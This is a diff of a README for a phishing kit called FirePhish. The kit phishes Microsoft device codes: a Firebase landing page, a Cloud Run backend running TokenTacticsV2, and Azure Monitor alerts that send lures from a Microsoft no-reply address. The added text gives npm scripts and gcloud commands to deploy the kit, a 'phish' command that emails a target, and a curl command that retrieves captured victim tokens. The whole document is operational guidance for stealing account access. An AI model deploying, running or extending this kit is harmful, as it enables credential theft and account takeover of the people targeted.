@@ -4,6 +4,19 @@ repos used: https://github.com/f-bader/TokenTacticsV2 (for handling device code 
        
 Minimal mostly vibe coded Eviltoken like implentation of Firebase-hosted device-code phishing website using Azure Monitor alerts to send emails from `azure-noreply@microsoft.com`.
 
+## npm scripts
+
+| Command | What it does |
+|---|---|
+| `npm run setup:env` | copies `.env.example` → `.env` so you can fill it in |
+| `npm run login:firebase` | `firebase login` + `firebase use --add` (writes `.firebaserc`) |
+| `npm run login:gcloud` | `gcloud auth login` + Docker auth helper |
+| `npm run login:azure` | `az login` |
+| `npm run deploy:container` | builds `container/`, pushes to GCR, deploys Cloud Run, writes `CLOUD_RUN_URL` back to `.env` |
+| `npm run deploy:firebase` | renders `public/config.js` from `.env` and deploys `public/` to Firebase Hosting |
+| `npm run deploy` | runs `deploy:container` then `deploy:firebase` |
+| `npm run phish -- <email>` | provisions a disposable Azure resource group + activity-log alert that fires an email to the target |
+
 ---
 
 ## Layout
@@ -67,7 +80,7 @@ For other distros, see Microsoft's [Azure CLI install docs](https://learn.micros
 
 ## First-time setup
 
-From inside `FirePhish/`:
+From inside `FirePhish/`. Each step has its own `npm run`.
 
 ### 1. Install local deps
 
@@ -75,42 +88,55 @@ From inside `FirePhish/`:
 npm install
 ```
 
-(Pulls `dotenv` for `build-config.js`.)
+Pulls `dotenv` for `build-config.js`.
 
-### 2. Configure environment
+### 2. Generate `.env`
 
 ```sh
-cp .env.example .env
+npm run setup:env
 $EDITOR .env
 ```
 
-Fill in:
+Copies `.env.example` → `.env` (no-op if `.env` already exists). Fill in:
 
 | Var | Source |
 |---|---|
-| `CLOUD_RUN_URL` | full URL of your backend's `/code` endpoint |
-| `API_KEY` | bearer token your backend expects |
+| `API_KEY` | bearer token shared between landing page and Cloud Run. `openssl rand -hex 32` is fine. |
+| `GCP_PROJECT` | your GCP project ID — same one selected with `gcloud config set project ...` |
+| `GCP_REGION` | Cloud Run region (e.g. `us-central1`) |
+| `LANDING_URL` | Firebase Hosting URL once deployed (e.g. `<project-id>.web.app`) — used in the phish email subject |
 | `TARGET_URL` | where the "Verify" button sends the victim. Default `https://microsoft.com/devicelogin` is correct for device-code flow. |
-| `LANDING_URL` | the Firebase Hosting URL of *this* page once deployed (used in the phish email subject) |
+| `CLOUD_RUN_URL` | leave the placeholder — `npm run deploy:container` writes the real URL back into `.env` for you |
 
 ### 3. Authenticate with Firebase
 
 ```sh
-firebase login
-firebase use --add
+npm run login:firebase
 ```
 
-`firebase use --add` lists every Firebase project on your Google account; pick one and give it an alias (`default` is fine). This writes `.firebaserc` in the current dir, scoping all subsequent `firebase` commands to that project. The file is gitignored — every fork starts clean and runs this step themselves.
+Runs `firebase login` then `firebase use --add`. The `--add` step lists every Firebase project on your Google account; pick one and give it an alias (`default` is fine). Writes `.firebaserc` in the repo root, scoping all subsequent `firebase` commands. The file is gitignored — every fork starts clean and runs this step themselves.
 
 If you don't have a Firebase project yet, create one at [console.firebase.google.com](https://console.firebase.google.com), then come back.
 
-### 4. Authenticate with Azure
+### 4. Authenticate with GCP
 
 ```sh
-az login
+npm run login:gcloud
 ```
 
-Opens a browser for SSO. If your terminal can't pop a browser (SSH session, etc.), use `az login --use-device-code`.
+Runs `gcloud auth login` and configures Docker for GCR pushes. Make sure the active project matches `GCP_PROJECT` in your `.env`:
+
+```sh
+gcloud config set project <your-gcp-project-id>
+```
+
+### 5. Authenticate with Azure
+
+```sh
+npm run login:azure
+```
+
+Opens a browser for SSO. SSH session? Use `az login --use-device-code`.
 
 If you have multiple subscriptions, set the active one:
 
@@ -118,6 +144,74 @@ If you have multiple subscriptions, set the active one:
 az account list -o table
 az account set --subscription "<id-or-name>"
 ```
+
+---
+
+## First deploy
+
+After steps 1–5 above, two commands ship the whole thing — or one if you prefer:
+
+### Option A — one shot
+
+```sh
+npm run deploy
+```
+
+Runs `deploy:container` then `deploy:firebase` back-to-back.
+
+### Option B — step by step
+
+#### 6. Deploy the container backend
+
+```sh
+npm run deploy:container
+```
+
+Builds `container/` → pushes to `gcr.io/$GCP_PROJECT/code-service` → deploys to Cloud Run in `$GCP_REGION` with `API_KEY` and the bundled TokenTacticsV2 `PWSH_CMD` set as env vars. On success it writes `CLOUD_RUN_URL=<service-url>/code` back into your `.env` so the next step picks it up automatically.
+
+The service is deployed `--allow-unauthenticated` because the browser calls it directly; access is gated by the bearer token in `API_KEY`. `--min-instances=1` keeps `/app/logs/response.json` warm between requests on the same instance so the captured token survives.
+
+#### 7. Deploy the landing page
+
+```sh
+npm run deploy:firebase
+```
+
+Runs `node scripts/build-config.js` (writes `public/config.js` from `.env`) then `firebase deploy --only hosting`. The CLI prints your hosting URL (`https://<project-id>.web.app`). If `LANDING_URL` in `.env` doesn't match, update it before sending any phish — the email subject is built from that string.
+
+---
+
+## Deploy the container backend (manual / other hosts)
+
+If you'd rather drive Cloud Run by hand, or deploy somewhere else, here's what the script wraps.
+
+### Env vars the backend reads
+
+| Var | Purpose |
+|---|---|
+| `PORT` | listen port (Cloud Run injects `8080`) |
+| `API_KEY` | bearer token; must match `API_KEY` in the landing page's `.env` |
+| `PWSH_CMD` | inline pwsh that drives TokenTacticsV2; the deploy script sets this for you |
+
+### Cloud Run (manual)
+
+```sh
+gcloud builds submit ./container --tag gcr.io/<your-project>/code-service
+gcloud run deploy code-service \
+  --image gcr.io/<your-project>/code-service \
+  --region <region> \
+  --platform managed \
+  --allow-unauthenticated \
+  --port 8080 \
+  --min-instances 1 \
+  --env-vars-file env.yaml
+```
+
+Where `env.yaml` contains `API_KEY` and `PWSH_CMD` — see `scripts/deploy-container.sh` for the exact `PWSH_CMD` block (TokenTacticsV2 device-code flow, no variable assignment so the device-code message reaches stdout).
+
+### Other hosts
+
+Any platform that runs a container with HTTPS and env vars works (Fly, Render, ECS, a self-hosted box behind a reverse proxy). The image listens on `$PORT` and needs both `API_KEY` and `PWSH_CMD` set.
 
 ---
 
@@ -137,65 +231,23 @@ Serves at `http://localhost:5000`. The `--project demo-test` keeps it emulator-o
 
 ---
 
-## First deploy
+## Retrieving captured tokens
 
-After steps 1–4 above:
+After the victim authenticates, the token JSON is written inside the container at `/app/logs/response.json`. Pull it with the bearer token:
 
 ```sh
-npm run build:firebase
+curl -H "Authorization: Bearer $API_KEY" https://<your-cloud-run-url>/logs
 ```
 
-That runs:
-
-1. `node scripts/build-config.js` — writes `public/config.js` from your `.env`
-2. `firebase deploy --only hosting` — uploads `public/` to your linked Firebase project
-
-The CLI prints your hosting URL (`https://<project-id>.web.app` and `https://<project-id>.firebaseapp.com`). Update `LANDING_URL` in `.env` to that URL if you didn't already.
+`--min-instances=1` (set by `deploy:container`) keeps the file warm between requests on the same instance.
 
 ---
 
-## Deploy the container backend
-
-The landing page calls a streaming `/code` endpoint over CORS with a bearer token. `container/` builds an image that runs `get-code.ps1` (PowerShell + bundled TokenTacticsV2) and exposes it as SSE. Any container host works; Cloud Run is the easiest fit since it's HTTPS by default and scales to zero.
-
-### Env vars the backend reads
-
-| Var | Purpose |
-|---|---|
-| `PORT` | listen port (Cloud Run injects `8080`) |
-| `API_KEY` | bearer token; must match `API_KEY` in the landing page's `.env` |
-| `PWSH_CMD` | optional inline pwsh; if unset, runs the bundled `get-code.ps1` |
-
-### Cloud Run (gcloud)
-
-```sh
-# from repo root, with a GCP project selected
-gcloud builds submit ./container --tag gcr.io/<your-project>/code-service
-gcloud run deploy code-service \
-  --image gcr.io/<your-project>/code-service \
-  --region <region> \
-  --platform managed \
-  --allow-unauthenticated \
-  --port 8080 \
-  --set-env-vars API_KEY=<same-token-as-landing-page>
-```
-
-`--allow-unauthenticated` is required because the browser calls it directly; access is gated by the bearer token in `API_KEY`. The CLI prints a `https://code-service-<hash>-<region>.a.run.app` URL — paste that into `CLOUD_RUN_URL` in your landing page `.env` and re-run `npm run build:firebase`.
-
-## get saved tokens
-
-to get saved tokens run 'curl -H `Authorization: Bearer $API_KEY" https://<your-cloud-run-url>/logs`   
-
-### Other hosts
-
-Any platform that runs a container with HTTPS and an env var works (Fly, Render, ECS, a self-hosted box behind a reverse proxy). The image listens on `$PORT` and only needs `API_KEY` set.
-
----
 
 ## Send the phishing email
 
 ```sh
-npm run firephish -- victim@example.com
+npm run phish -- victim@example.com
 ```
 
 What the script does:
